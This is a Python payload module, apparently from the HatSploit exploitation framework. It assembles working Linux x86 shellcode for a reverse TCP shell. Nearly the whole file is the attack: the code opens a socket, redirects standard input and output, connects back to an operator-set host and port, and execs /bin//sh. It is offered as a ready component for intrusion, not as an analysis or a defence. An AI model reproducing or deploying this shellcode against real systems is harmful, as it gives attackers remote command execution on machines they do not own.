"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Assembler, Socket):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x86 Shell Reverse TCP",
            'Payload': "linux/x86/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for Linux x86.",
            'Architecture': "x86",
            'Platform': "linux",
            'Rank': "high",
            'Type': "reverse_tcp",
        }

    def run(self):
        rhost = self.pack_host(self.handler['RHOST'])
        rport = self.pack_port(self.handler['RPORT'])

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                xor ebx, ebx
                mul ebx
                push ebx
                inc ebx
                push ebx
                push byte +0x2
                mov ecx, esp
                mov al, 0x66
                int 0x80

                xchg eax, ebx
                pop ecx

            dup:
                mov al, 0x3f
                int 0x80

                dec ecx
                jns dup
                push 0x{rhost.hex()}
                push 0x{rport.hex()}0002
                mov ecx, esp
                mov al, 0x66
                push eax
                push ecx
                push ebx
                mov bl, 0x3
                mov ecx, esp
                int 0x80

                push edx
                push 0x68732f2f
                push 0x6e69622f
                mov ebx, esp
                push edx
                push ebx
                mov ecx, esp
                mov al, 0xb
                int 0x80
            """
        )
